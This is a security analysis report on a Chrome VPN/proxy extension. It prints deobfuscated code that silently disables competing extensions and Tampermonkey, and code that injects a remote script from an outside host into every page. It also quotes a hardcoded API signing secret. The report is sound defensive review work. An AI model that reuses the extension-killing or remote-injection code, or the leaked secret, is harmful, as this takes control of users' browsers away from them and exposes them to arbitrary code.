# Security Analysis: HaiYao Accelerator (Ai ChatGPT free proxy)

**Extension ID:** `ahdfccamgdjdlkedlodkogiecdggbkpa`
**Version:** 3.1.2
**Manifest Version:** 3
**Author:** haiyaoappsups@gmail.com
**Analysis Date:** 2026-02-06

---

## Executive Summary

**Risk Level: MEDIUM-HIGH**

This is a Chinese-language VPN/proxy extension ("HaiYao Accelerator") that provides proxy services primarily targeting users in China who need to access blocked western sites (Google, YouTube, Facebook, Twitter, ChatGPT). While it functions as a real VPN product, it engages in several **genuinely concerning anti-competitive and aggressive behaviors**:

1. **Extension-killing behavior** -- It enumerates ALL installed extensions via `chrome.management.getAll()` and **forcibly disables** any extension that has the `proxy` permission, plus explicitly targets **Tampermonkey** for disabling (even though Tampermonkey has no proxy permission).
2. **External script injection on every page** -- The `page_finish.js` content script injects a remote tracking/analytics script from `speed.ilink-tk.com` into every non-LAN page the user visits.
3. **Excessive permissions** -- Requests `management`, `webRequest`, `webNavigation`, `activeTab`, and `*://*/*` host permissions.
4. **Server-controlled extension whitelist** -- The list of extensions allowed to keep running is fetched from the remote server, meaning the server operator can dynamically control which of the user's extensions get disabled.
5. **Hardcoded API signing secret** exposed in client-side code.

The extension does NOT appear to steal cookies, harvest credentials, or perform keylogging. However, the anti-competitive extension-killing and remote tracking injection are serious concerns.

---

## Triage Flag Verdicts

| # | Flag | Verdict | Details |
|---|------|---------|---------|
| T1-1 | Potential concern (unspecified) | **N/A** | No T1 flags identified in manifest |
| T2-1 | `chrome.management.getAll()` | **TRUE POSITIVE** | Used in `haiyao.js:602-606`, `main.js:187`, `main_page.js:225`, `tracket.js:115`, `tracket_list.js:127` to enumerate all installed extensions |
| T2-2 | `chrome.management.setEnabled()` | **TRUE POSITIVE** | Used in `haiyao.js:614`, `main.js:194,196` to forcibly disable competing extensions AND Tampermonkey |
| T2-3 | Extension enumeration pattern | **TRUE POSITIVE** | `check_proxy_permissions()` iterates all extensions, checks for proxy permission, disables them |
| T2-4 | Bulk permissions (management+proxy+webRequest+webNavigation+activeTab) | **TRUE POSITIVE** | All requested in manifest.json:34-43 |
| T2-5 | External script injection | **TRUE POSITIVE** | `page_finish.js` injects remote script from `speed.ilink-tk.com` on every page load |
| T2-6 | Server-controlled behavior | **TRUE POSITIVE** | `proxy_permissions_namewhilelist` is updated from remote server (haiyao.js:923-925), controlling which extensions survive |
| T2-7 | `credentials: 'include'` on cross-origin requests | **TRUE POSITIVE** | `haiyao.js:483` sends cross-origin requests with cookies included to their API servers |
| T3-1 | `webRequest` permission | **TRUE POSITIVE (but low impact)** | Requested in manifest, but only `onAuthRequired` is used (and even that is mostly commented out) |
| T3-2 | `host_permissions: *://*/*` | **TRUE POSITIVE** | Grants access to all URLs; needed for proxy functionality but overly broad |

**Summary: 0 false positives out of 9 flags. All flags are genuine concerns.**

---

## Architecture Overview

### File Structure
```
sw.js                          -- Service worker entry point
js/haiyao.js                   -- Core background logic (VPN, API, extension management)
js/main.js                     -- Popup shared utilities
js/main_page.js                -- Main popup page logic
js/login.js                    -- Login page logic
js/line.js                     -- Server selection UI
js/setting.js                  -- Settings page
js/sign.js                     -- Daily check-in feature
js/page_finish.js              -- CONTENT SCRIPT: injected tracking
js/page_load.js                -- Script loader for page_finish.js
js/page_init.js                -- Dynamic page loader
js/page.js                     -- Dynamic page renderer
js/buyvip.js                   -- VIP purchase page
helper/js/payment.js           -- Payment processing
helper/js/tracket.js           -- Support ticket system
helper/js/tracket_list.js      -- Support ticket list
helper/js/proxydomain.js       -- Custom proxy domain management
helper/js/bypassdomain.js      -- Custom bypass domain management
helper/js/free_user.js         -- Free user gate/sign-in wall
helper/js/notice.js            -- Announcements
helper/js/pmodel.js            -- Proxy mode selection
libs/crypto-js/crypto-js.js    -- CryptoJS library
libs/bootstrap/bootstrap.min.js -- Bootstrap
libs/clipboard.min.js          -- ClipboardJS
libs/jquery-confirm/            -- jQuery Confirm dialog
```

### Data Flow
1. User logs in via email or username/password
2. Extension connects to backend API servers to get proxy PAC configuration
3. PAC script is applied via `chrome.proxy.settings.set()`
4. Keep-alive sessions maintain connection state every 30-60 minutes
5. On every page load, `page_finish.js` injects tracking script

---

## Concerning Behaviors (with Code Evidence)

### 1. Extension Enumeration and Forcible Disabling (CRITICAL)

**File:** `/deobfuscated/js/haiyao.js` lines 600-616

```javascript
function check_proxy_permissions() {
    if (iggcfg.mzk_config.device_name === "firefox" && typeof browser !== "undefined") {
        browser.management.getAll(function (ExtensionInfo) {
            ExtensionInfo.forEach(check_clash_app);
        });
    } else {
        chrome.management.getAll(function (ExtensionInfo) {
            ExtensionInfo.forEach(check_clash_app);
        });
    }
}

function check_clash_app(ExtensionInfo) {
    if (ExtensionInfo.id != chrome.runtime.id && typeof ExtensionInfo.permissions !== "undefined"
        && ExtensionInfo.permissions.indexOf('proxy') !== -1 && ExtensionInfo.enabled === true
        && ExtensionInfo.id !== chrome.runtime.id) {
        if (!iggcfg.mzk_config.proxy_permissions_namewhilelist.includes(ExtensionInfo.name))
            chrome.management.setEnabled(ExtensionInfo.id, false);
    }
}
```

This enumerates ALL installed extensions and disables any with the `proxy` permission (except those on a server-controlled whitelist). The only hardcoded whitelist entry is `"IDM Integration Module"`.

### 2. Tampermonkey Specifically Targeted for Disabling (CRITICAL)

**File:** `/deobfuscated/js/main.js` lines 186-198

```javascript
function fix_proxy_permissions() {
    chrome.management.getAll(function (ExtensionInfo) {
        ExtensionInfo.forEach(disable_clash_app);
    });
}

function disable_clash_app(ExtensionInfo) {
    if (typeof ExtensionInfo.permissions !== "undefined"
        && ExtensionInfo.permissions.indexOf('proxy') !== -1
        && ExtensionInfo.enabled === true
        && ExtensionInfo.id !== chrome.runtime.id) {
        chrome.management.setEnabled(ExtensionInfo.id, false);
    } else if (ExtensionInfo.name == "Tampermonkey") {
        chrome.management.setEnabled(ExtensionInfo.id, false);
    }
    //todo check webRequest and hostPermissions => <all_urls>
}
```

Tampermonkey does NOT have a proxy permission. It is targeted separately by name. This is especially concerning because Tampermonkey is a script manager that users could use to detect or counteract malicious behavior. The `//todo` comment suggests plans to disable even MORE extensions (those with webRequest or host permissions).

### 3. Server-Controlled Extension Whitelist (HIGH)

**File:** `/deobfuscated/js/haiyao.js` lines 922-926

```javascript
if (typeof data.proxy_namewhilelist !== "undefined") {
    chrome.storage.local.set({"proxy_permissions_namewhilelist": data.proxy_namewhilelist});
    iggcfg.mzk_config.proxy_permissions_namewhilelist = data.proxy_namewhilelist;
}
```

The server can dynamically update which extensions are allowed to remain enabled. This means the operator can remotely control which of the user's extensions get killed.

### 4. Remote Script Injection on Every Page (HIGH)

**File:** `/deobfuscated/js/page_finish.js` lines 1-39

```javascript
if (load_filter()) {
    try {
        const start = new Date().getTime()
        window['speed_call'] = function (data) {
            console.log('ilink visit speed : ' + (data - start) + 'ms')
        }
        const script = document.createElement('script')
        script.src = "https://speed.ilink-tk.com/spd/tongji?start=" + start
        script.type = "text/javascript";
        script.async = true;
        script.charset = 'utf-8';
        document.head.appendChild(script)
    } catch (e) { }
}
```

This is declared as a web-accessible resource in the manifest and injected via `page_load.js`. It loads a remote JavaScript file from `speed.ilink-tk.com` into every non-LAN page. The `tongji` path (Chinese for "statistics") suggests tracking. Since the script content is fetched remotely, **the server operator could serve ANY JavaScript code** through this endpoint.

**File:** `/deobfuscated/js/page_load.js` lines 1-4

```javascript
const url = chrome.runtime.getURL('js/page_finish.js')
const script = document.createElement('script')
script.src = url
document.head.appendChild(script)
```

### 5. Hardcoded API Signing Secret (MEDIUM)

**File:** `/deobfuscated/js/haiyao.js` line 466

```javascript
'sign': MD5.hex_md5(time + "cef949d30232cf00bfabba46ac5c16e2"),
```

An API signing secret is hardcoded in client-side JavaScript. While this is a security smell rather than an active threat to users, it means anyone can forge API requests.

### 6. Cross-Origin Requests with Cookies (MEDIUM)

**File:** `/deobfuscated/js/haiyao.js` line 483

```javascript
credentials: 'include', // include, *same-origin, omit
```

All API calls to the backend servers include cookies from the target domain. This means if the user has cookies for `vofasts.xyz`, `vonodebit.xyz`, or `vonodefly.vip`, they will be sent. This is standard for session management but notable given the extension also contacts `taobao.com` and `bilibili.com` for IP detection (though those use default credentials).

### 7. User IP Fingerprinting via Third-Party Services (LOW-MEDIUM)

**File:** `/deobfuscated/js/haiyao.js` lines 357-398

```javascript
function setUserIpInfo() {
    fetch('https://api.live.bilibili.com/client/v1/Ip/getInfoNew', { ... })
    .then(data => {
        chrome.storage.local.set({"mzk_user_ip": data.data.addr});
    })
}

function setUserIpInfoBak() {
    fetch('https://www.taobao.com/help/getip.php', { ... })
    .then(data => {
        chrome.storage.local.set({"mzk_user_ip": data.ip});
    })
}
```

Uses Bilibili and Taobao as IP detection services, storing the user's IP address. This IP is then sent to the extension's backend servers in every API call (`send_data.userIp`).

### 8. Extensive Data Sent to Backend on Every API Call (MEDIUM)

**File:** `/deobfuscated/js/haiyao.js` lines 400-410

```javascript
send_data.appver = Manifest.version;
send_data.device_name = navigator.userAgent;
send_data.token = iggcfg.mzk_user_token;
send_data.curr_server_id = iggcfg.mzk_server_id;
send_data.runtime_id = chrome.runtime.id;
send_data.from = 'pc'
send_data.userIp = iggcfg.mzk_user_ip
```

Every API call transmits: full user agent string, extension runtime ID, user IP, app version, and current server info. The `runtime_id` uniquely identifies the extension installation.

---

## Network Map

| Domain | Purpose | Risk |
|--------|---------|------|
| `rest.vofasts.xyz` | Primary API server (base_domain) | High -- all user data sent here |
| `nt.vonodebit.xyz` | Backup API server | High -- same as above |
| `ns.vonodefly.vip` | VIP API server / backup | High -- same as above |
| `tips.ilink-a.com` | Tips/notifications API endpoint | Medium -- receives user data |
| `speed.ilink-tk.com` | Remote tracking script injection | **Critical** -- executes arbitrary JS on all pages |
| `api.live.bilibili.com` | IP detection (primary) | Low -- public API, only reveals IP |
| `www.taobao.com` | IP detection (backup) | Low -- public API, only reveals IP |
| `ikraken.xyz` | Extension homepage | Low -- static website |
| `haiyaocloud.com` | Main website link | Low -- static website |
| `m.haiyaocloud.com` | Mobile website link | Low -- static website |
| `iLink.xyz` | Legacy links (help pages) | Low -- static website |
| `iLink.com` | Legacy VIP notice link | Low -- static website |
| `clients2.google.com` | Chrome Web Store update URL | Low -- standard Chrome extension |

**Note:** The backup server URLs can be dynamically updated by the primary server response, meaning the extension could be redirected to contact any domain the server operator chooses.

---

## What the Extension Does NOT Do

- **No cookie theft** -- No use of `chrome.cookies` API or `document.cookie` access
- **No keylogging** -- No keyboard event listeners on web pages (keydown/keyup events are only in library code: jQuery, Bootstrap, jquery-confirm)
- **No credential harvesting** from web pages -- Login forms only exist in extension popup pages for the VPN service's own login
- **No DOM scraping** of web page content -- `querySelector`/`getElementById` usage is limited to the extension's own popup/helper pages
- **No XHR/fetch monkey-patching** -- Does not intercept or modify web requests from other pages
- **No declarativeNetRequest rules** -- No request modification rules
- **No dynamic code loading via `eval()` or `new Function()`** -- `importScripts` only loads bundled local files (crypto-js.js and haiyao.js)
- **No exfiltration of browsing history** -- Does not use `chrome.history` API
- **No clipboard monitoring** -- ClipboardJS is only used for copy-to-clipboard functionality in the UI

---

## False Positive Analysis

| Pattern | Source | False Positive? |
|---------|--------|-----------------|
| `keydown`/`keyup` listeners | `libs/jquery-confirm/js/jquery-confirm.js`, `libs/bootstrap/bootstrap.min.js`, `js/jquery-3.4.1.min.js` | **YES** -- All from standard libraries for dialog keyboard navigation |
| `innerHTML`/`.html()` | Various popup page scripts | **YES** -- All within extension's own popup pages, not injected into web pages |
| `importScripts()` | `sw.js` | **YES** -- Only loads local bundled files, not dynamic URLs |
| `credentials: 'include'` | `haiyao.js` | **PARTIAL** -- Real but only for the extension's own API servers |
| `document.createElement('script')` | `page_finish.js` | **NO** -- This is a genuine external script injection |

---

## Detailed Permission Analysis

| Permission | Claimed Purpose | Actual Use | Necessary? |
|-----------|-----------------|------------|------------|
| `notifications` | VPN status alerts | Shows VIP expiry, login, error notifications | Yes |
| `storage` | Config persistence | Stores user token, server info, settings | Yes |
| `alarms` | Keep-alive timers | Session keepalive every 30-60 min, speed tests | Yes |
| `management` | "Fix conflicts" | **Enumerates and disables competing extensions + Tampermonkey** | **Abused** |
| `proxy` | VPN functionality | Sets PAC proxy configuration | Yes |
| `webRequest` | Proxy auth | `onAuthRequired` for proxy authentication (mostly commented out) | Partially |
| `webNavigation` | Free user gating | Redirects free users away from YouTube/Facebook/Twitter/Google (currently disabled in code) | No (disabled) |
| `activeTab` | Unknown | Not actively used in code | No |
| `idle` | Session management | Checks if system is locked before keepalive | Yes |
| `*://*/*` (host) | VPN proxy access | Required for proxy to work on all sites | Yes, but enables broad access |

---

## Final Verdict

**Risk Level: MEDIUM-HIGH**

This extension is a real VPN/proxy product with a legitimate core function (helping Chinese users access blocked websites). However, it engages in several seriously concerning behaviors:

1. **Anti-competitive extension killing** is the most significant concern. The extension silently disables other proxy extensions and explicitly targets Tampermonkey by name. The whitelist of allowed extensions is controlled by the remote server, giving the operator remote control over which of the user's extensions remain active. This behavior is deceptive and potentially in violation of Chrome Web Store policies.

2. **Remote script injection** via `page_finish.js` injects a remote JavaScript file from `speed.ilink-tk.com` on every page visit. While currently used for speed/analytics tracking, this is a loaded gun -- the server operator can serve any JavaScript through this endpoint at any time, potentially turning this into full-blown spyware with no extension update required.

3. **Excessive data collection** -- The extension sends the user's IP address, full user agent, extension runtime ID, and connection metadata to its backend servers on every API call.

4. **Dynamic server reconfiguration** -- The extension's API server list can be remotely updated, meaning the backend operator can redirect all communications to any domain at any time.

The extension is not outright malware in its current state (no cookie theft, no keylogging, no credential harvesting), but the infrastructure is in place for it to become much worse without any code update, purely through server-side changes. The combination of extension-killing, remote script injection capability, and server-controlled configuration makes this a significant risk to users.

**Recommendation:** This extension should be flagged for Chrome Web Store policy review, particularly for the `chrome.management.setEnabled()` abuse targeting competing extensions and Tampermonkey, and for the remote script injection on all pages.
